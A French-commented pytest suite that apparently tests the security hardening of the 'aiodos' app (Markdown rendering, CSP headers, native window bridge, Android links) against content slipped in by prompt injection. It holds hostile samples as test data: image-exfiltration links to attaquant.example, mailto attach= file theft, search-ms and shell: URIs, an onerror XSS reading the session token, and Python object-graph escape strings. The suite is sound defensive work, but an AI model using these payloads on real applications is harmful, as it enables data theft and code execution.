"""Sécurité de l'interface (audit du 20/10/2026) : ce qu'une autre machine, un modèle prêté
par un ami ou une page piégée (injection d'invite) arrive à glisser dans la page ne doit ni y
lancer un script, ni faire sortir des données sans clic, ni ouvrir une autre application.

- rendu Markdown (render.py) : aucune image chargée d'office (seule s'affiche celle écrite
  dans la réponse même, data:image/…), liens seulement vers le web et les courriels, un
  courriel sans pièce jointe (attach=…), le tout en une passe (une réponse se rend de
  nouveau à chaque morceau reçu) ;
- en-têtes de protection (api/security.py) : politique de contenu (CSP) de l'interface,
  nosniff, et l'API jamais exécutée comme une page ;
- interface (dom.js) : le profil d'une machine n'entre dans la page que sous forme de nombres,
  un clic sur un lien n'ouvre que le web ou un courriel, un fichier lâché ne remplace pas
  l'interface ;
- fenêtre native (ui/window.py) : le pont vers Python n'atteint que ses quatre fonctions et
  ne répond qu'à l'interface, la fenêtre ne quitte pas l'interface et rien de ce qu'elle
  demande ne part vers un autre hôte, ses liens target=_blank ne lancent pas n'importe quel
  programme ;
- appli Android (MainActivity.java) : même règle pour les liens qui sortent de l'appli.
"""
import json
import os
import re
import shutil
import subprocess
import sys
import types
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from starlette.datastructures import MutableHeaders

from aiodos import paths, render
from aiodos.api import security
from aiodos.api.server import create_app
from aiodos.knowledge import store
from aiodos.ui import window
from tests import i18n_js

TOKEN = "jeton-de-test"
AUTH = {"X-Aiodos-Token": TOKEN}
NODE = shutil.which("node")


# ----------------------------------------------------------------- rendu Markdown
@pytest.mark.parametrize("text", [
    "![x](https://attaquant.example/p.png?d=resume%20secret)",
    "![r][ref]\n\n[ref]: http://192.168.1.2/p.png?d=1",
    "![](//attaquant.example/x)",
    "Voici : ![](HTTPS://ATTAQUANT.EXAMPLE/X.PNG)",
    "[![logo](https://attaquant.example/l.png)](https://site.example)",
])
def test_no_image_is_ever_loaded_by_itself(text):
    html = render.to_html(text)
    assert "<img" not in html
    assert "[image" in html                              # le texte reste, à cliquer


def test_an_image_becomes_a_link_to_click():
    html = render.to_html('![le " graphique](https://e.example/g.png?a=1&b=2)')
    assert 'href="https://e.example/g.png?a=1&amp;b=2"' in html
    assert 'target="_blank"' in html and 'rel="noopener noreferrer"' in html
    assert "[image : le &quot; graphique]" in html
    # Ni web ni écrite dans la réponse (//hôte, chemin du nœud) : du texte, sans lien ; file:
    # et data: autre qu'une image, markdown-it les laisse en texte brut
    for source in ("/api/settings", "//e.example/x", "file:///C:/x.png",
                   "data:image/svg+xml;base64,PHN2Zz4=", "data:text/html;base64,PGI+"):
        html = render.to_html(f"![x]({source})")
        assert "<a" not in html and "<img" not in html, source
        assert "[image : x]" in html or f"![x]({source})" in html, source


def test_an_image_written_in_the_reply_shows():
    """data:image/png;base64,… ne va rien chercher ailleurs : elle s'affiche."""
    pixel = ("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAA"
             "AABJRU5ErkJggg==")
    html = render.to_html(f'![un " point](data:image/png;base64,{pixel})')
    assert (f'<img class="inline-image" src="data:image/png;base64,{pixel}" '
            'alt="un &quot; point">') in html
    for kind in ("jpeg", "gif", "webp", "PNG"):
        assert "<img" in render.to_html(f"![x](data:image/{kind};base64,AAAA)")
    # Rien d'autre qu'une image en base64 : pas de SVG (des scripts), pas de guillemet glissé
    for source in ("data:image/svg+xml;base64,PHN2Zz4=", "data:image/png,brut",
                   'data:image/png;base64,AA"onerror="x', "data:image/png;base64,"):
        assert "<img" not in render.to_html(f"![x]({source})"), source


@pytest.mark.parametrize(("link", "kept"), [
    ("mailto:moi@exemple.fr", "mailto:moi@exemple.fr"),
    ("mailto:moi@exemple.fr?subject=Salut&attach=C:/Users/moi/secret.txt&body=Bonjour",
     "mailto:moi@exemple.fr?subject=Salut&body=Bonjour"),
    ("mailto:?ATTACHMENT=/sdcard/x&To=a@b.c&cc=d@e.f", "mailto:?To=a@b.c&cc=d@e.f"),
    ("mailto:a@b.c?%61ttach=C:/x&bcc=espion@e.f", "mailto:a@b.c"),
    ("mailto:a@b.c?subject=x#attach=C:/secret.txt", "mailto:a@b.c?subject=x"),   # le fragment
    ("mailto:a@b.c#attach=C:/secret.txt", "mailto:a@b.c"),
])
def test_a_mail_link_keeps_only_its_recipients_subject_and_text(link, kept):
    """Certaines messageries ont joint d'office le fichier nommé par attach=… : un lien piégé
    ferait partir un fichier de la machine avec le courriel."""
    assert render.plain_mail(link) == kept
    html = render.to_html(f"[écrire]({link})")
    assert "attach" not in html.lower() and "%61ttach" not in html
    assert f'href="{kept.replace("&", "&amp;")}"' in html


class _Read(list):
    """Les jetons d'un paragraphe, tels que les règles de rendu les reçoivent : compte chaque
    jeton lu, un par un ou par tranche (tokens[:idx] copie toute la tranche)."""
    count = 0

    def __getitem__(self, key):
        got = super().__getitem__(key)
        _Read.count += len(got) if isinstance(key, slice) else 1
        return got

    def __iter__(self):
        for token in super().__iter__():
            _Read.count += 1
            yield token


def _work(module, text) -> int:
    """Le travail du rendu de `text` par `module` (render.py) : ses lignes exécutées, et les
    jetons que lisent ses règles. Un compte, pas une durée : la charge de la machine n'y
    change rien."""
    from markdown_it.renderer import RendererHTML
    source = os.path.normcase(module.__file__)
    lines = 0

    def local(frame, event, arg):
        nonlocal lines
        lines += event == "line"
        return local

    def tracer(frame, event, arg):
        return local if os.path.normcase(frame.f_code.co_filename) == source else None

    inline = RendererHTML.renderInline
    _Read.count = 0
    previous = sys.gettrace()
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(RendererHTML, "renderInline",
                      lambda self, tokens, *rest: inline(self, _Read(tokens), *rest))
        sys.settrace(tracer)
        try:
            module.to_html(text)
        finally:
            sys.settrace(previous)
    return lines + _Read.count


@pytest.mark.parametrize("piece", ["![](x)", "[![a](https://e/x)](https://ok) ",
                                   "[a](search-ms:x) ", "[a](https://ok) "])
def test_rendering_stays_linear(piece):
    """Une réponse se rend de nouveau à chaque morceau reçu (api/routes/chat.py), sur la
    boucle qui sert aussi les autres machines : quatre fois plus d'images ou de liens, quatre
    fois plus de travail, pas seize (relire tout ce qui précède à chaque image : 15 000 images
    en près de 8 s)."""
    small = _work(render, piece * 500)
    large = _work(render, piece * 2000)
    assert large < 5 * small, (piece, small, large)


@pytest.mark.parametrize("target", [
    "search-ms:query=facture&crumb=location:%5C%5Cattaquant%5Cpartage",
    "ms-word:ofe|u|https://attaquant.example/doc",
    "intent://scan/#Intent;scheme=zxing;end",
    "ms-settings:about",
    "shell:startup",
    "/api/settings",
    "#ailleurs",
])
def test_links_open_only_the_web_or_an_email(target):
    html = render.to_html(f"[Ouvrir le dossier partagé]({target})")
    assert "<a" not in html and "href" not in html
    assert "Ouvrir le dossier partagé" in html and 'class="link-off"' in html


def test_autolinks_follow_the_same_rule():
    html = render.to_html("<search-ms:query=x> <https://ok.example/a> <moi@exemple.fr>")
    assert 'href="search-ms' not in html
    assert 'href="https://ok.example/a"' in html and 'href="mailto:moi@exemple.fr"' in html


def test_web_and_email_links_still_work():
    html = render.to_html("[site](https://example.org) [Site](HTTP://EXAMPLE.ORG) "
                          "[écrire](mailto:moi@exemple.fr)")
    assert html.count('target="_blank"') == 3 and html.count("<a ") == 3
    assert render.opens_outside(" https://x") and render.opens_outside("mailto:a@b.c")
    assert not render.opens_outside("javascript:alert(1)")
    assert not render.opens_outside("http:attaquant")       # sans « // »


# ------------------------------------------------------------- en-têtes de protection
@pytest.fixture
def client(fake_embed):
    store.ensure_defaults()
    with TestClient(create_app(TOKEN, {"testserver"})) as c:
        yield c


def _directives(policy: str) -> dict:
    out = {}
    for part in policy.split(";"):
        words = part.split()
        if words:
            out[words[0]] = words[1:]
    return out


def test_the_interface_runs_only_its_own_scripts(client):
    for path in ("/", "/index.html", "/js/app.js", "/css/app.css", "/pygments.css"):
        response = client.get(path)
        assert response.status_code == 200, path
        policy = _directives(response.headers["content-security-policy"])
        assert policy["script-src"] == ["'self'"], path          # ni onerror=, ni eval
        assert policy["connect-src"] == ["'self'"]               # rien ne part ailleurs
        assert all(not re.match(r"https?:|\*", s) for s in policy["img-src"])
        assert policy["object-src"] == ["'none'"] and policy["base-uri"] == ["'none'"]
        assert policy["frame-ancestors"] == ["'none'"]
        assert response.headers["x-content-type-options"] == "nosniff"
        assert response.headers["referrer-policy"] == "no-referrer"


def test_what_the_interface_needs_stays_allowed(client):
    """Modules, styles en ligne (les vues en posent beaucoup), images data: (app.css),
    créations (blob:), vidéos et flux d'événements de la même origine."""
    policy = _directives(client.get("/").headers["content-security-policy"])
    assert "'unsafe-inline'" in policy["style-src"]
    assert {"'self'", "data:", "blob:"} <= set(policy["img-src"])
    assert {"'self'", "blob:"} <= set(policy["media-src"])
    html = (paths.STATIC_DIR / "index.html").read_text(encoding="utf-8")
    assert "<script" in html and not re.search(r"<script(?![^>]*\bsrc=)", html)  # aucun en ligne
    for script in (paths.STATIC_DIR / "js").rglob("*.js"):
        code = script.read_text(encoding="utf-8")
        assert not re.search(r"\son[a-z]+=[\"']", code), f"gestionnaire en ligne dans {script.name}"
        assert not re.search(r"\beval\(|new Function\b", code), script.name


def test_the_api_is_never_run_as_a_page(client):
    for response in (client.get("/api/settings", headers=AUTH),
                     client.get("/api/settings"),                               # 401
                     client.get("/api/settings", headers={**AUTH, "Host": "evil.example"})):
        assert response.headers["x-content-type-options"] == "nosniff"
        assert "sandbox" in response.headers["content-security-policy"]


def test_created_images_and_videos_open_as_they_are():
    for kind, sandboxed in (("image/png", False), ("video/webm", False), ("image/webp", False),
                            ("image/svg+xml", True), ("text/html; charset=utf-8", True),
                            ("application/json", True)):
        message = {"type": "http.response.start", "status": 200,
                   "headers": [(b"content-type", kind.encode())]}
        security.protect(MutableHeaders(scope=message), api=True)
        headers = dict(message["headers"])
        assert headers[b"x-content-type-options"] == b"nosniff"
        assert (b"sandbox" in headers.get(b"content-security-policy", b"")) is sandboxed, kind


def test_a_route_keeps_the_headers_it_chose():
    message = {"type": "http.response.start", "status": 200,
               "headers": [(b"content-security-policy", b"default-src 'none'")]}
    security.protect(MutableHeaders(scope=message), api=False)
    assert dict(message["headers"])[b"content-security-policy"] == b"default-src 'none'"


def test_scripts_keep_their_type_whatever_windows_says(client, monkeypatch):
    """nosniff : un module servi en text/plain (registre de Windows modifié par un éditeur)
    serait refusé, et l'interface resterait blanche."""
    import starlette.responses
    monkeypatch.setattr(starlette.responses, "guess_type", lambda *a, **k: ("text/plain", None))
    assert client.get("/js/app.js").headers["content-type"].startswith("text/javascript")
    assert client.get("/css/app.css").headers["content-type"].startswith("text/css")
    assert client.get("/").headers["content-type"].startswith("text/html")


def test_a_token_with_accents_is_refused_without_crashing(client):
    response = client.get("/api/settings", headers={"X-Aiodos-Token": "jéton".encode("utf-8")})
    assert response.status_code == 401


# ---------------------------------------------------------- interface (Node.js)
def _run_dom(tmp_path, body: str):
    (tmp_path / "dom.mjs").write_bytes((paths.STATIC_DIR / "js" / "dom.js").read_bytes())
    prelude = i18n_js.install(tmp_path)                        # les textes, en français
    (tmp_path / "package.json").write_text('{"type": "module"}', encoding="utf-8")
    (tmp_path / "essai.mjs").write_text(
        prelude + "import * as dom from './dom.mjs';\n" + body, encoding="utf-8")
    done = subprocess.run([NODE, str(tmp_path / "essai.mjs")], capture_output=True, text=True,
                          encoding="utf-8", errors="replace")
    assert done.returncode == 0, done.stderr[:400]
    return json.loads(done.stdout)


@pytest.mark.skipif(NODE is None, reason="Node.js absent")
def test_a_peer_profile_enters_the_page_only_as_numbers(tmp_path):
    hostile = "<img src=x onerror=alert(sessionStorage.getItem('aiodos-token'))>"
    out = _run_dom(tmp_path, f"""
const hostile = {json.dumps(hostile)};
console.log(JSON.stringify({{
  level: dom.powerText({{ power: {{ mobile: true, plugged: true, level: hostile }} }}),
  temperature: dom.powerText({{ power: {{ mobile: true, temperature: hostile }} }}),
  objects: dom.powerText({{ power: {{ mobile: true, level: {{ toString: () => hostile }} }} }}),
  odd: dom.powerText({{ power: hostile, on_ac_power: true }}),
  fine: dom.powerText({{ power: {{ mobile: true, plugged: true, level: 84, temperature: 31.2 }} }}),
  count: dom.count({{ length: hostile }}),
  list: dom.count(['a', 'b']),
}}));""")
    for key in ("level", "temperature", "objects", "odd"):
        assert "<" not in out[key] and "onerror" not in out[key], key
    assert out["fine"] == "En charge · batterie 84 % · 31,2 °C"
    assert out["odd"] == "Sur secteur"
    assert out["count"] == 0 and out["list"] == 2


@pytest.mark.skipif(NODE is None, reason="Node.js absent")
def test_a_reply_link_opens_only_the_web_or_an_email(tmp_path):
    hrefs = ["https://a.example", "HTTP://A.EXAMPLE", "mailto:moi@exemple.fr",
             "search-ms:query=x", "ms-word:ofe|u|https://e", "intent://x", " javascript:x",
             "//attaquant.example", "/api/settings", "", None]
    out = _run_dom(tmp_path, f"console.log(JSON.stringify({json.dumps(hrefs)}.map(dom.linkKind)));")
    assert out == ["web", "web", "mail"] + [None] * 8


@pytest.mark.skipif(NODE is None, reason="Node.js absent")
def test_a_click_on_a_reply_link(tmp_path):
    """linkAction (dom.js), ce que chat.js fait d'un clic : « block » retient le lien,
    « external » le fait ouvrir par le nœud, « follow » le laisse suivre son cours."""
    cases = [  # adresse, bouton, fenêtre native, attendu
        ("https://a.example", 0, True, "external"),      # /api/open_url, le navigateur du PC
        ("https://a.example", 0, False, "follow"),       # un onglet ; Android : son navigateur
        ("https://a.example", 1, True, "follow"),        # clic du milieu : OutsideLinks
        ("mailto:moi@exemple.fr", 0, True, "follow"),    # la messagerie
        ("mailto:moi@exemple.fr", 0, False, "follow"),
        ("search-ms:query=x", 0, True, "block"),
        ("search-ms:query=x", 1, True, "block"),
        ("search-ms:query=x", 0, False, "block"),
        ("intent://x#Intent;end", 0, False, "block"),
        ("/api/settings", 0, True, "block"),
        (" javascript:alert(1)", 1, False, "block"),
        (None, 0, False, "block"),
    ]
    out = _run_dom(tmp_path, f"""console.log(JSON.stringify({json.dumps(cases)}.map(
  ([href, button, nativeWindow]) => dom.linkAction(href, {{ button, nativeWindow }}))));""")
    assert out == [case[3] for case in cases]


def test_the_reply_click_handler_follows_link_action():
    """chat.js : clic et clic du milieu passent par linkAction ; seul « follow » laisse faire."""
    code = (paths.STATIC_DIR / "js" / "views" / "chat.js").read_text(encoding="utf-8")
    assert "addEventListener('auxclick', onReplyLink)" in code
    click = code[code.index("function onMessageClick"):code.index("function scrollBottom")]
    assert "onReplyLink(e);" in click and "linkKind(" not in click
    handler = click[click.index("function onReplyLink"):]
    assert re.search(r"linkAction\(link\.getAttribute\('href'\),\s*\{ button: e\.button, "
                     r"nativeWindow: inNativeWindow\(\) \}\)", handler)
    assert handler.index("if (action === 'follow') return;") < handler.index("e.preventDefault();")
    assert "if (action === 'external') openExternal(link.href)" in handler


def test_a_web_source_is_a_link_only_to_the_web():
    """chat.js : une source « web » n'est un lien que si linkKind la dit « web » (http,
    https) ; sinon c'est du texte, comme render.py le fait dans les réponses. Relecture du
    21/10/2026 : javascript: et search-ms: y devenaient des liens (target=_blank), que seul
    onReplyLink retenait. La recherche ne rend d'ailleurs plus que du http(s) (web.py)."""
    code = (paths.STATIC_DIR / "js" / "views" / "chat.js").read_text(encoding="utf-8")
    sources = code[code.index("sources(list) {"):code.index("done(html, error)")]
    link = sources.index('<a class="source"')
    assert "if (s.type === 'web' && linkKind(s.url) === 'web') {" in sources[:link]
    assert sources.count("<a ") == 1
    assert "class=\"source link-off\" title=\"${esc(t('render.link_off', { url: s.url }))}\"" \
        in sources


# --------------------------------------------------------------------- fenêtre native
def _reached(api, name) -> bool:
    """pywebview (util.js_bridge_call) trouve-t-il quelque chose à appeler sous ce nom, que
    la page envoie par chrome.webview.postMessage ? Il le cherche parmi les fonctions
    exposées, puis dans js_api, attribut après attribut."""
    from webview import util
    found = []

    class Fake:
        _functions = {f.__name__: f for f in window.BRIDGE}
        _js_api = api

        def evaluate_js(self, script):
            found.append(script)
    with pytest.MonkeyPatch.context() as patch:   # rien n'est vraiment appelé
        patch.setattr(util, "Thread", lambda target: types.SimpleNamespace(
            start=lambda: found.append(target)))
        util.js_bridge_call(Fake(), name, [], "1")
    return bool(found)


def test_the_bridge_reaches_nothing_but_its_four_functions():
    pytest.importorskip("webview")
    assert _reached(window.SEALED, "pick_folder")
    for name in ("_window.gui.os.system", "__class__.__base__.__subclasses__",
                 "__init__.__globals__", "__class__.__init__", "gui.os.system"):
        assert not _reached(window.SEALED, name), name
    # Pourquoi pas js_api=None : depuis None, les types de Python restent atteignables
    assert _reached(None, "__class__.__base__.__subclasses__")


class _Event:
    def __iadd__(self, handler):
        return self


def test_the_window_gives_pywebview_functions_not_an_object(monkeypatch):
    seen = {}

    class Created:
        events = types.SimpleNamespace(closed=_Event(), shown=_Event())

        def expose(self, *functions):
            seen["exposed"] = [f.__name__ for f in functions]

    def create_window(*args, **kwargs):
        seen["kwargs"] = kwargs
        return Created()
    monkeypatch.setattr(window.webview, "create_window", create_window)
    monkeypatch.setattr(window.webview, "start", lambda *a, **k: None)
    monkeypatch.setattr(window, "_open", [])
    monkeypatch.setattr(window.instance, "on_show", lambda fn: None)
    monkeypatch.setitem(window._state, "window", None)
    window.run(lambda: "http://127.0.0.1:1/", on_closed=lambda: None)
    assert seen["kwargs"]["js_api"] is window.SEALED
    assert seen["exposed"] == ["pick_files", "pick_folder", "save_image", "show_image_file"]


class _Shown:
    """La fenêtre principale, réduite à ce que le pont lui demande."""

    def __init__(self, url):
        self.url, self.dialogs = url, []

    def get_current_url(self):
        return self.url

    def create_file_dialog(self, *args, **kwargs):
        self.dialogs.append(args)
        return ["C:/choisi.txt"]


@pytest.fixture
def shown(monkeypatch):
    page = _Shown("http://127.0.0.1:5123/?t=jeton")
    monkeypatch.setitem(window._state, "window", page)
    monkeypatch.setitem(window._state, "origin", window._origin("http://127.0.0.1:5123/?t=jeton"))
    return page


def test_the_bridge_answers_only_the_node_interface(shown):
    assert window.pick_files() == ["C:/choisi.txt"]
    assert window.pick_folder() == ["C:/choisi.txt"]
    for elsewhere in ("file:///C:/Users/moi/Downloads/piege.html", "https://attaquant.example/",
                      "http://127.0.0.1:11434/", "http://localhost:5123/"):
        shown.url = elsewhere
        assert window.pick_files() == [] and window.pick_folder() == []
        assert window.save_image(1) is None and window.show_image_file(1) is False
    assert len(shown.dialogs) == 2


def test_the_bridge_wants_a_real_creation_number(shown, monkeypatch):
    from aiodos.imaging import gallery
    asked = []
    monkeypatch.setattr(gallery, "get", lambda number: asked.append(number))
    for bad in (True, -1, 0, "1; calc", "١", 1.5, None, [1], {"id": 1}):
        assert window.save_image(bad) is None and window.show_image_file(bad) is False
    assert asked == []
    assert window.save_image("7") is None and asked == [7]     # inconnue : rien


def test_the_window_does_not_leave_the_interface(monkeypatch):
    monkeypatch.setitem(window._state, "origin", None)
    assert not window.refused_navigation("data:text/html,attente")    # écran d'attente
    monkeypatch.setitem(window._state, "origin", window._origin("http://127.0.0.1:5123/?t=x"))
    assert not window.refused_navigation("http://127.0.0.1:5123/")
    assert not window.refused_navigation("HTTP://127.0.0.1:5123/api/images/1/file?t=x")
    for uri in ("file:///C:/Users/moi/Downloads/piege.html", "https://attaquant.example/",
                "http://127.0.0.1:5124/", "http://127.0.0.1:11434/", "about:blank"):
        assert window.refused_navigation(uri), uri


def test_target_blank_links_launch_only_a_browser_or_a_mail_client(monkeypatch):
    opened = []
    monkeypatch.setattr(window.webbrowser, "open", lambda url, *a, **k: opened.append(url) or True)
    links = window.OutsideLinks()
    for url in ("search-ms:query=x&crumb=location:\\\\attaquant\\partage", "ms-settings:about",
                "shell:startup", "file:///C:/Windows/System32/calc.exe", "C:/Windows/x.exe", ""):
        assert links.open(url) is False, url
    assert links.open("https://example.org/") and links.open("mailto:moi@exemple.fr")
    assert opened == ["https://example.org/", "mailto:moi@exemple.fr"]
    assert links.open("mailto:moi@exemple.fr?attach=C:/secret.txt&subject=Salut")
    assert opened[-1] == "mailto:moi@exemple.fr?subject=Salut"          # sans pièce jointe
    assert links.open("mailto:moi@exemple.fr#attach=C:/secret.txt")
    assert opened[-1] == "mailto:moi@exemple.fr"                         # ni par le fragment
    # Le moteur de pywebview (edgechromium : webbrowser.open au NewWindowRequested) s'en sert
    engine = types.ModuleType("webview.platforms.edgechromium")
    engine.webbrowser = window.webbrowser
    monkeypatch.setitem(sys.modules, "webview.platforms.edgechromium", engine)
    window.guard_new_windows()
    assert isinstance(engine.webbrowser, window.OutsideLinks)
    assert engine.webbrowser.open("intent://x") is False


@pytest.mark.skipif(NODE is None, reason="Node.js absent")
def test_the_interface_keeps_dropped_files_from_replacing_it(tmp_path):
    """dropRefused (dom.js) : des fichiers jamais, du texte seulement dans une zone de saisie."""
    out = _run_dom(tmp_path, """console.log(JSON.stringify([
  dom.dropRefused(['Files'], true), dom.dropRefused(['text/uri-list', 'Files'], false),
  dom.dropRefused({ length: 1, 0: 'Files' }, true),
  dom.dropRefused(['text/plain'], true), dom.dropRefused(['text/uri-list'], false),
  dom.dropRefused(null, true), dom.dropRefused(undefined, false)]));""")
    assert out == [True, True, True, False, True, False, True]
    code = (paths.STATIC_DIR / "js" / "app.js").read_text(encoding="utf-8")
    assert "keepDrops();" in code and "document.addEventListener('drop'" in code
    assert "dropRefused(e.dataTransfer?.types, acceptsText(e.target))" in code


@pytest.mark.skipif(NODE is None, reason="Node.js absent")
def test_text_drops_only_into_real_text_fields(tmp_path):
    """acceptsText (dom.js) : un lien lâché sur une case à cocher, un curseur, un bouton ou un
    champ en lecture seule n'y entre pas ; non retenu, il remplacerait la page."""
    out = _run_dom(tmp_path, """
const field = (tagName, props = {}) => {
  const el = { tagName, isContentEditable: false, readOnly: false, disabled: false, ...props };
  el.closest = selector => el;
  return el;
};
const inside = parent => ({ tagName: 'SPAN', isContentEditable: false, closest: () => parent });
console.log(JSON.stringify([
  dom.acceptsText(field('TEXTAREA')),
  dom.acceptsText(field('INPUT', { type: 'text' })),
  dom.acceptsText(field('INPUT', { type: 'search' })),
  dom.acceptsText(field('INPUT', { type: 'password' })),
  dom.acceptsText(field('INPUT', { type: 'number' })),
  dom.acceptsText(field('DIV', { isContentEditable: true, closest: () => null })),
  dom.acceptsText(field('INPUT', { type: 'checkbox' })),
  dom.acceptsText(field('INPUT', { type: 'range' })),
  dom.acceptsText(field('INPUT', { type: 'button' })),
  dom.acceptsText(field('INPUT', { type: 'file' })),
  dom.acceptsText(field('INPUT', { type: 'text', readOnly: true })),
  dom.acceptsText(field('TEXTAREA', { disabled: true })),
  dom.acceptsText({ tagName: 'DIV', isContentEditable: false, closest: () => null }),
  dom.acceptsText(inside(null)),
  dom.acceptsText(null),
]));""")
    assert out == [True] * 6 + [False] * 9


class _Handlers:
    """Un événement .NET (+=), réduit à la liste de ses gestionnaires."""

    def __init__(self):
        self.handlers = []

    def __iadd__(self, handler):
        self.handlers.append(handler)
        return self


class _Core:
    """CoreWebView2, réduit à ce que la garde des requêtes lui demande."""

    def __init__(self):
        self.WebResourceRequested = _Handlers()
        self.filters = []
        self.Environment = types.SimpleNamespace(
            CreateWebResourceResponse=lambda content, status, reason, headers: ("refus", status))

    def AddWebResourceRequestedFilter(self, uri, context):
        self.filters.append((uri, context))


def _webview2(core):
    control = types.SimpleNamespace(NavigationStarting=_Handlers(), CoreWebView2=core,
                                    CoreWebView2InitializationCompleted=_Handlers())
    return control, types.SimpleNamespace(
        native=types.SimpleNamespace(browser=types.SimpleNamespace(webview=control)))


def _request(core, uri):
    args = types.SimpleNamespace(Request=types.SimpleNamespace(Uri=uri), Response=None)
    for handler in core.WebResourceRequested.handlers:
        handler(None, args)
    return args.Response


@pytest.fixture
def webview2_core(monkeypatch):
    """Le module .NET du filtre, absent hors de la fenêtre : une sonde à sa place."""
    module = types.ModuleType("Microsoft.Web.WebView2.Core")
    module.CoreWebView2WebResourceContext = types.SimpleNamespace(All="toutes")
    monkeypatch.setitem(sys.modules, "Microsoft.Web.WebView2.Core", module)
    monkeypatch.setitem(window._state, "guarded", False)
    monkeypatch.setitem(window._state, "origin", None)


def test_nothing_the_window_asks_for_leaves_for_another_host(webview2_core):
    """Annuler la navigation ne suffit pas : WebView2 envoyait quand même la requête à l'hôte
    étranger (essai réel du 20/10). Elle reçoit un 403 sans quitter la machine."""
    core = _Core()
    control, shown_window = _webview2(core)
    window._guard_navigation(shown_window)
    assert core.filters == [("*", "toutes")] and len(core.WebResourceRequested.handlers) == 1
    assert _request(core, "http://127.0.0.1:9/ailleurs") is None       # écran d'attente
    window._state["origin"] = window._origin("http://127.0.0.1:5123/?t=x")
    for uri in ("http://127.0.0.1:5123/api/events?t=x", "HTTP://127.0.0.1:5123/js/app.js",
                "ws://127.0.0.1:5123/flux", "data:image/png;base64,AAAA",
                "blob:http://127.0.0.1:5123/1234"):
        assert _request(core, uri) is None, uri
    for uri in ("http://127.0.0.1:9/ailleurs?d=secret", "https://attaquant.example/x",
                "http://localhost:5123/", "https://127.0.0.1:5123/", "wss://attaquant.example/",
                "file:///C:/Users/moi/piege.html", "ftp://attaquant.example/x"):
        assert _request(core, uri) == ("refus", 403), uri
    # Et la navigation elle-même est annulée
    args = types.SimpleNamespace(Uri="https://attaquant.example/", Cancel=False)
    control.NavigationStarting.handlers[0](None, args)
    assert args.Cancel is True


def test_the_request_guard_waits_for_webview2(webview2_core):
    """À l'apparition de la fenêtre, WebView2 peut démarrer encore : la garde attend qu'il
    soit prêt."""
    control, shown_window = _webview2(None)
    window._guard_navigation(shown_window)
    assert len(control.CoreWebView2InitializationCompleted.handlers) == 1
    core = control.CoreWebView2 = _Core()
    control.CoreWebView2InitializationCompleted.handlers[0](
        None, types.SimpleNamespace(IsSuccess=True))
    window._state["origin"] = window._origin("http://127.0.0.1:5123/")
    assert _request(core, "https://attaquant.example/") == ("refus", 403)
    window._guard_navigation(shown_window)                    # une seule fois
    assert len(control.NavigationStarting.handlers) == 1


# ------------------------------------------------------------------------ Android
def test_the_android_app_opens_outside_only_the_web_or_an_email():
    """Pas de téléphone ici : la règle est lue dans la source (MainActivity.java)."""
    java = (paths.APP_ROOT / "android" / "src" / "fr" / "arkane" / "aiodos"
            / "MainActivity.java").read_text(encoding="utf-8")
    override = java[java.index("shouldOverrideUrlLoading"):java.index("web.setVisibility")]
    assert override.index("opensOutside(uri)") < override.index("startActivity(")
    assert "CATEGORY_BROWSABLE" in override
    rule = java[java.index("static boolean opensOutside"):]
    rule = rule[:rule.index("\n    }\n")]
    assert sorted(re.findall(r'scheme\.equals\("([a-z]+)"\)', rule)) == ["http", "https", "mailto"]


def _android_jar():
    for root in (os.environ.get("ANDROID_HOME"), os.environ.get("ANDROID_SDK_ROOT")):
        if root:
            jars = sorted(Path(root).glob("platforms/android-*/android.jar"))
            if jars:
                return jars[-1]
    return None


@pytest.mark.skipif(not (shutil.which("javac") and shutil.which("java") and _android_jar()),
                    reason="javac, java ou le SDK Android absents")
def test_the_android_app_sends_a_mail_without_attachments(tmp_path):
    """MainActivity.plainMail, compilée et lancée hors du téléphone (NodeService, qui tient
    à Chaquopy, remplacé par une sonde) : la même règle que render.plain_mail."""
    source = paths.APP_ROOT / "android" / "src" / "fr" / "arkane" / "aiodos"
    stubs = tmp_path / "fr" / "arkane" / "aiodos"
    stubs.mkdir(parents=True)
    (stubs / "NodeService.java").write_text("""package fr.arkane.aiodos;
class NodeService {
    static volatile String url;
    static volatile String error;
    static void start(android.content.Context context) { }
    static void languageChanged() { }
}""", encoding="utf-8")
    # Les identifiants des textes (res/values*.xml, Texts.java) : R, que la construction génère
    names = sorted({m for xml in (paths.APP_ROOT / "android" / "res" / "values").glob("*.xml")
                    for m in re.findall(r'<string name="(\w+)"', xml.read_text(encoding="utf-8"))})
    (stubs / "R.java").write_text(
        "package fr.arkane.aiodos;\npublic final class R {\n    public static final class string {\n"
        + "".join(f"        public static final int {name} = {i + 1};\n" for i, name in enumerate(names))
        + "    }\n}\n", encoding="utf-8")
    (stubs / "Essai.java").write_text("""package fr.arkane.aiodos;
public class Essai {
    public static void main(String[] links) {
        for (String link : links) System.out.println(MainActivity.plainMail(link));
    }
}""", encoding="utf-8")
    jar = str(_android_jar())
    built = subprocess.run(
        ["javac", "-nowarn", "-encoding", "UTF-8", "-cp", jar, "-d", str(tmp_path / "out"),
         str(source / "MainActivity.java"), str(source / "Relaunch.java"),
         str(source / "Texts.java"), str(stubs / "NodeService.java"), str(stubs / "R.java"),
         str(stubs / "Essai.java")],
        capture_output=True, text=True, errors="replace")
    assert built.returncode == 0, built.stderr[-1500:]
    links = ["mailto:moi@exemple.fr",
             "mailto:moi@exemple.fr?subject=Salut&attach=/sdcard/secret.txt&body=Bonjour",
             "mailto:?ATTACHMENT=/sdcard/x&To=a@b.c&cc=d@e.f",
             "mailto:a@b.c?%61ttach=/sdcard/x&bcc=espion@e.f",
             "mailto:a@b.c?subject=x#attach=/sdcard/secret.txt",
             "mailto:a@b.c#attach=/sdcard/secret.txt"]
    ran = subprocess.run(["java", "-cp", os.pathsep.join([str(tmp_path / "out"), jar]),
                          "fr.arkane.aiodos.Essai", *links],
                         capture_output=True, text=True, errors="replace")
    assert ran.returncode == 0, ran.stderr[-1500:]
    assert ran.stdout.split() == [render.plain_mail(link) for link in links]
    assert ran.stdout.split()[1] == "mailto:moi@exemple.fr?subject=Salut&body=Bonjour"
    java = (source / "MainActivity.java").read_text(encoding="utf-8")
    override = java[java.index("shouldOverrideUrlLoading"):java.index("web.setVisibility")]
    assert override.index("plainMail(") < override.index("startActivity(")
